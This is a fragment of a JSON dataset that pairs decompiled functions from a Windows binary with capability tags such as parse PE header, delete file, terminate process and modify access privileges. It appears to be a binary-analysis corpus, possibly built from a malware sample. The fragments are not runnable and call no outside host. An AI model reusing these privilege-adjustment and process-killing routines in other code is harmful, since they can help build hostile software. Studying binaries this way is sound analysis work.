        "decompiled_code": "\nvoid __cdecl fcn.00402837(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint lpString;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar1 = fcn.004154a9();\n    uVar2 = 0;\n    if (uVar1 != 0) {\n        do {\n            fcn.004154d0(uVar2);\n            lpString = fcn.00415629();\n            arg_8h_00 = fcn.0040d63e(lpString);\n            if (arg_8h_00 != 0) {\n                fcn.00402709(arg_8h_00, arg_ch);\n                fcn.0040af12();\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "004034ad": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004034ad(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x41c6c0 != 0) {\n        do {\n            fcn.0040c349(*(*0x41c6a8 + uVar1 * 4));\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x41c6c0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00409804": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00409804(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x41df5c != 0) {\n        do {\n            fcn.004096c5(param_1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x41df5c);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00409a7d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00409a7d(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t *unaff_ESI;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((unaff_ESI != NULL) && (*unaff_ESI != 0)) {\n        do {\n            iVar1 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(param_1, *(unaff_ESI[1] + uVar2 * 4));\n            if (iVar1 != 0) {\n                return 1;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *unaff_ESI);\n    }\n    return 0;\n}\n",
        "token_count": 163
    },
    "0040a484": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a484(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    \n    uVar3 = 0;\n    iVar1 = fcn.0040ae05(0);\n    if ((iVar1 != 0) && (unaff_EDI != 0)) {\n        do {\n            uVar2 = fcn.0040ae05(8);\n            *(iVar1 + uVar3 * 4) = uVar2;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < unaff_EDI);\n    }\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "0040ad69": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0040ad69(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint ProcessHeaps;\n    \n    iVar1 = *0x41e198;\n    uVar4 = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeaps)(0xff, &ProcessHeaps);\n    if (((uVar2 != 0) && (uVar2 < 0x100)) && (uVar3 = 0,  uVar2 != 0)) {\n        do {\n            if ((&ProcessHeaps)[uVar3] == iVar1) {\n                uVar4 = 1;\n                break;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 211
    },
    "0040f2dd": {
        "rules": [
            "contain loop",
            "parse PE header"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040f2dd(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x4190a0, 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1c) = 0x6a7d;\n    *(unaff_EBP + -0x1c) = 0x5a4d;\n    piVar1 = *(unaff_EBP + 8) & 0xfffff000;\n    do {\n        *(unaff_EBP + 8) = piVar1;\n        if (*piVar1 == *(unaff_EBP + -0x1c)) {\n            *(unaff_EBP + -0x1c) = 0x7560;\n            *(unaff_EBP + -0x1c) = 0x4550;\n            if (*(piVar1 + *(piVar1 + 0x1e)) == 0x4550) {\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00415f27();\n                return;\n            }\n        }\n        piVar1 = piVar1 + -0x800;\n    } while( true );\n}\n",
        "token_count": 322
    },
    "00412858": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00412858(void)\n\n{\n    uint16_t in_AX;\n    int32_t iVar1;\n    \n    iVar1 = 5;\n    do {\n        *0x41b038 = *0x41b038 | in_AX & 0xff;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return 0x2fcb;\n}\n",
        "token_count": 88
    },
    "004137fb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004137fb(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        do {\n            in_EAX = in_EAX + -1;\n            param_1[in_EAX] = 0;\n        } while (in_EAX != 0);\n    }\n    return *param_1;\n}\n",
        "token_count": 92
    },
    "004154a9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004154a9(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    cVar1 = fcn.004152ab();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        for (iVar2 = *(in_EAX + 0x10); iVar2 != 0; iVar2 = *(iVar2 + 8)) {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 141
    },
    "004154d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004154d0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    cVar1 = fcn.004152ab();\n    iVar4 = iVar3;\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        iVar2 = *(in_EAX + 0x10);\n        while ((iVar4 = iVar3,  iVar2 != 0 && (iVar4 = iVar2,  param_1 != 0))) {\n            iVar2 = *(iVar2 + 8);\n            param_1 = param_1 + -1;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 186
    },
    "004013a1": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013a1(uint lpBuffer)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint32_t uVar2;\n    uint32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint lpNumberOfBytesRead;\n    \n    uVar2 = 0;\n    if (unaff_ESI <= *unaff_EDI) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(*0x41c25c, lpBuffer);\n        if ((iVar1 != 0) && (in_ECX == unaff_ESI)) {\n            uVar2 = 1;\n        }\n        *unaff_EDI = *unaff_EDI - in_ECX;\n        in_EAX = in_ECX;\n    }\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 199
    },
    "0040cae1": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040cae1(uint lpFileName)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint UnicodeString;\n    \n    uVar3 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SearchPathW)(0, lpFileName, 0, 0x208, &lpBuffer, 0);\n    if (uVar1 != 0) {\n        uVar1 = (*_sym.imp.ntdll.dll_RtlDosPathNameToNtPathName_U)(&lpBuffer, &UnicodeString, 0, 0);\n        if (uVar1 != '\\0') {\n            var_1ch = &UnicodeString;\n            var_24h = 0x18;\n            var_20h = 0;\n            var_18h = 0x40;\n            var_14h = 0;\n            var_10h = 0;\n            iVar2 = (*_sym.imp.ntdll.dll_NtDeleteFile)(&var_24h);\n            uVar3 = -1 < iVar2;\n            uVar1 = (*_sym.imp.ntdll.dll_RtlFreeUnicodeString)(&UnicodeString);\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 334
    },
    "00402034": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402034(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    uVar3 = 0;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(arg_8h, arg_ch, 0, 0, 0, &var_4h);\n    if (iVar2 == 0) {\n        uVar3 = fcn.0040ae05(0);\n        iVar2 = (*pcVar1)(arg_8h, arg_ch, 0, 0, uVar3, &var_4h);\n        if (iVar2 != 0) {\n            fcn.0040af12();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 223
    },
    "00411b9b": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411b9b(uint lpString2, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    uVar4 = 0;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(arg_ch, arg_10h, 0, 0, 0, &var_4h);\n    if ((uVar2 == 0) && (uVar2 = fcn.0040ae05(0),  uVar2 != 0)) {\n        iVar3 = (*pcVar1)(arg_ch, arg_10h, 0, 0, uVar2, &var_4h);\n        if (iVar3 == 0) {\n            (*_sym.imp.SHLWAPI.dll_PathUnquoteSpacesW)(uVar2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(uVar2, lpString2);\n            if (iVar3 == 0) {\n                uVar4 = 1;\n            }\n        }\n        uVar2 = fcn.0040af12();\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 314
    },
    "00406816": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00406816(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 59
    },
    "0040c2c9": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nbool fcn.0040c2c9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    if ((param_1 != iVar1) && (iVar1 = fcn.0040c210(1, param_1),  iVar1 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        bVar2 = iVar1 != 0;\n        fcn.0040c13c();\n    }\n    return bVar2;\n}\n",
        "token_count": 147
    },
    "0040c5a3": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c5a3(uint lpName)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint NewState;\n    uint lpLuid;\n    uint uStack20;\n    uint var_ch;\n    uint TokenHandle;\n    \n    cVar1 = fcn.0040f898(lpName);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0;\n        TokenHandle = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar4 != 0) {\n            NewState = 0;\n            lpLuid = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, lpName, &lpLuid);\n            if (iVar4 != 0) {\n                NewState = 1;\n                var_ch = 2;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n                if (iVar4 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar4 != 0x514) {\n                        uVar2 = 1;\n                    }\n                }\n            }\n        }\n        fcn.0040c13c();\n    }\n    return uVar2;\n}\n",
        "token_count": 377
    },
    "0041528b": {
        "rules": [
            "allocate thread local storage"
        ],
        "decompiled_code": "\nvoid fcn.0041528b(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00415279();\n    if (cVar1 == '\\0') {\n        *0x41e1e0 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n        *0x41e1e4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    }\n    return;\n}\n",
        "token_count": 93
    }
}